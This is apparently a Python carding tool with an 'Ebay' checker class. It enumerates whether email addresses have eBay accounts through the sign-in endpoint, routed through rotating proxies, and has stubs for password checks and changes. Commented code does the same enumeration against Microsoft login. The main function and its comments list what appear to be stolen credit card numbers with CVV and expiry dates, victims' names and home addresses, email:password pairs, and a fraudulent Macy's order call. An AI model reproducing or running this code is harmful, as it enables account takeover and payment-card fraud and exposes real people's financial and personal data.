#!/usr/bin/python
# -*- coding: utf-8 -*-   
# -*- coding: latin-1 -*-
import re, random;
import sys, time,os;
from PIL import Image, ImageMath
import json, urllib, base64, mybrowser,captcha2upload
from urllib.parse import urlparse, parse_qsl
import asyncio
from pyppeteer import launch
# from furl import furl
class FinalForm:
    """ Final form of registration
    """
    form = "form";
    html = "source code";
    captchaControlName = None;
    questionControlName = None;
    captchaImage = None;
    captchaResult = None;
    keyantigate = None;
    questionString = None;
    questionResult = None;
    listLink = None;

    def __init__(self, form, html):
        self.form = form;
        self.html = html;


class Ebay:
    """ Test reg forum
    """


    def __init__(self, emit='', qtcode='', header='', orderfinalForm=[], updatestatus='update',captcha_queue=None):
        self.updatestatus = updatestatus
        self.orderfinalForm = orderfinalForm;

        # ua.set_debug_responses(False)
        self.captcha_queue = captcha_queue;
        self.emit = emit;
        self.qtcode = qtcode;
        self.browser = mybrowser.Rqbrowser()
        # self.browser.link_host = 'store.bigfishgames.com'
        # self.browser.link_origin = 'https://store.bigfishgames.com'
        self.decaptcha_key = 'aa15c055da98e4867e9c924dce54f1e2'


    def add_header(self, link_refer, XMLHttpRequest=None, extraHeader={}):
        self.browser.add_header(link_refer, XMLHttpRequest=XMLHttpRequest, extraHeader=extraHeader)

    def fixHTML(self, html):
        return html.replace("'", '"');


    def fake_socks(self, sock):
        self.browser.set_proxies(sock5=sock)

    def check_exist(self, account, sock='',sock_type=''):
        if sock and sock_type == 'socks':
            self.browser.set_proxies(sock5=sock)
        elif sock and sock_type == 'proxy':
            self.browser.set_proxies(proxy=sock)

#         browser = await launch(headless=True,args=[
#    '--disable-extensions',
#    '--hide-scrollbars',
#    '--disable-bundled-ppapi-flash',
#    '--mute-audio',
#    '--no-sandbox',
#    '--disable-setuid-sandbox',
#    '--disable-gpu',  #
#    '--start-maximized',
#    '--proxy-server=rsproxy.online:10000',
#    '--disable-infobars',
#    "--enable-automation",
# ],
#         autoClose=False)
#         page = await browser.newPage()
#         await page.goto('https://login.live.com')
#         await page.screenshot({'path': 'test.png'})
#         await page.focus('[name="loginfmt"]')
#         # await page.focus('.loginfmt')
#         await page.keyboard.type('test54saadasadsd')
#         await page.click('[type="submit"]')
#         await page.waitForSelector('#progressBar')
#         await page.waitForSelector('#progressBar', {'hidden': True})
#         cont = await page.content()
#         if cont.find("That Microsoft account doesn't exist") != -1:
#             print("====doesn't exist===")
#         else:
#             print("====Existed===")
#         # print(cont)
#         print('==done==')

        i = 0
        while i <= 4:
            try:
                r = self.browser.open('https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ru=https%3A%2F%2Fwww.ebay.com%2F')
                html = r.text
                # print(html)
            except Exception as e:
                print(e)
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            print('check die:socks die')
            return 'check die:socks die'
        # c = open('dien.html','w', encoding='utf-8')
        # c.write(html)

        # all_forms = self.browser.selectForm(html)
        # login_form = None
        # action_link = None
        # for form in all_forms:
        #     input_form = self.browser.getInputForm(form)
        #     print(input_form)
        #     if 'srt' in input_form:
        #         login_form = input_form
        #         action_link = self.browser.getActionUrl(form)
        #         break
        #     # print(input_form)
        # print(action_link,login_form['srt'])
        srtRe = re.search('csrfAjaxToken":"(.+?)"',html)
        if srtRe:
            srtValue = srtRe.group(1).strip()
            print('==srtValue==',srtValue)
        else:
            print('check die:socks die')
            return 'check die:socks die'
        extraHeader = {
    "accept": "*/*",
    "host": "signin.ebay.com",
    "origin": "https://signin.ebay.com",
    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,vi;q=0.6",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "pragma": "no-cache",
    "x-ebay-requested-with": "XMLHttpRequest",
    "x-requested-with": "XMLHttpRequest"
  }
        self.browser.add_header('https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ru=https%3A%2F%2Fwww.ebay.com%2F', extraHeader=extraHeader)
        link_request = 'https://signin.ebay.com/signin/srv/identifer'
        data_request = {}
        # print(account)
        data_request['identifier'] = account
        data_request['srt'] = srtValue

        # login_form['userid'] = account
        i = 0
        while i <= 4:
            try:
                r = self.browser.open(link_request, data=data_request)
                # print(r.status_code)
                html = r.text
                # print(html)
            except Exception as e:
                print(e)
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            print('check die:socks die')
            return 'check die:socks die'
        # c = open('dien.html','w', encoding='utf-8')
        # c.write(html)
        if html.find('err":"invalid"') != -1:
            print(account,'==Not Existed==')
            return
        elif html.find('An error occurred when we tried to process your request') != -1:
            print(account,'check die:socks die')
            return 'check die:socks die'
        elif html.find('allowOptedInUserToSignIn":true') != -1:
            print(account,'==Existed==')
            return account



    def site_login(self,email,password,sock='',order=False,sock_type=''):
        print('Logged to your account')
        return email.strip() + '|' + password.strip()


    def send_message(self, message, to_user=None):
        """Send message to user
        @param message
        @param to_user user nick name, default is self.nicknamerequest
        @return
        """
        if not to_user:
            to_user = 'ruandejun';
        try:
            f = open('temp_data_chat2.txt', 'a')
            f.write('\n' + to_user + '|:|[+]' + message);
            f.plush()
            f.close()
        except:
            pass
        return

    def update_status(self, status):
        print(status)
        if self.updatestatus.find('ircbot') == -1:
            try:
                self.emit(self.qtcode.SIGNAL(self.updatestatus + '(QString,QString)'), "updatestatus", str(status))
            except:
                pass
        else:
            to_user = self.updatestatus.split('|')[1].strip()
            print(to_user)
            self.send_message(status, to_user=to_user)

    def random_string(self):
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        min = 8
        max = 12
        stringimg = ''
        for x in random.sample(alphabet, random.randint(min, max)):
            stringimg += x
        return stringimg
    #################################

    def check(self, email='', password='', username='', sock='', sock_type='', check_exist=False):
        # self.creat_browser()
        self.sock = sock
        if self.sock and sock_type == 'proxy':
            self.browser.set_proxies(proxy=self.sock)
        elif self.sock and sock_type == 'socks':
            # print self.sock
            self.browser.set_proxies(sock5=self.sock)
        if not check_exist:
            login_html = self.site_login(email, password, sock=self.sock, sock_type=sock_type)
            if login_html.find('check die') == -1:
                if login_html.find('Reset pass') != -1:
                    # ebay_infomation = 'Use clear socks for change password'
                    ebay_infomation = self.change_password_old(email=email, password=password, sock=sock)
                    return ebay_infomation
                else:
                    ebay_infomation = self.get_information(login_html)
                if ebay_infomation:
                    return email + '|' + password + '|' + ebay_infomation
                else:
                    return email + '|' + password
            else:
                print(login_html)
                return login_html
        else:
            login_html = self.site_login(email, password, sock=self.sock, sock_type=sock_type)
            if login_html.find('check die') == -1:
                if login_html.find('Reset pass') != -1:
                    # ebay_infomation = 'Use clear socks for change password'
                    ebay_infomation = self.change_password_old(email=email, password=password, sock=sock)
                    return ebay_infomation
                else:
                    ebay_infomation = self.get_information(login_html)
                if ebay_infomation:
                    return email + '|' + password + '|' + ebay_infomation
                else:
                    return email + '|' + password
            else:
                print(login_html)
                return login_html


def main():


    listbilling = 'Yingge|Wang|39078 Guradino Dr. APT 308||Fremont|CA|94538|Visa6087|4388576044536087|2|2019'
    list_address_drop = 'Yingge|Wang|39078 Guradino Dr. APT 308||Fremont|CA|94538|Visa6087|4388576044536087|2|2019'
    #1288375392|FPTgeoEICiYnzs@sbcglobal.net|brynargust@yahoo.com|bryn0320
    #4147098647146372|12|2019|00|Brandon Braun|Address||||||bdogg3000@gmail.com
    #5376280708882256|12|2026
    ordervr = Ebay()
    ordervr.check_exist('india008@hotmail.com')
    # ordervr.check(ccnumber='4179030014451797',ccmonth='09',ccyear='2022',cvv='7523',sock='rsproxy.online:10000',sock_type='proxy')
    # ordervr.get_info_account_infomation()
    # ordervr.change_email_info()='
    # check_status = ordervr.check_order_status('1250059297','stephanie_mun@gorge.net',sock='127.0.0.1:9951')
    # print(check_status
    # check = ordervr.check('LizaHickey@gmail.com','sahale',sock='127.0.0.1:9951',sock_type='socks')
    # print(check
    # card_id = ordervr.get_macys_card_info('208172905',get_all=True)
    # print(card_id
    # bskvarla@pacbell.net|Hanoi123
    #artglasscreations@sbcglobal.net|dakota|TravisL|buss|2374 Hardscrabble Rd||Drain|OR|97435|Macys4580|438283264580|1|1999
    # status = ordervr.order('','',list_card='4147099237311806|11|2020',
    #                        account_infomation='kittyvaidai|hanoi123',
    #                        sock='127.0.0.1:9951', flavors='', item_name='',
    #                        item_id_link='http://www1.macys.com/shop/product/chanel-coco-noir-eau-de-parfum-1.7-oz?ID=725964',
    #                        weight='')
    # print(status


if __name__ == "__main__":
    sys.exit(main())
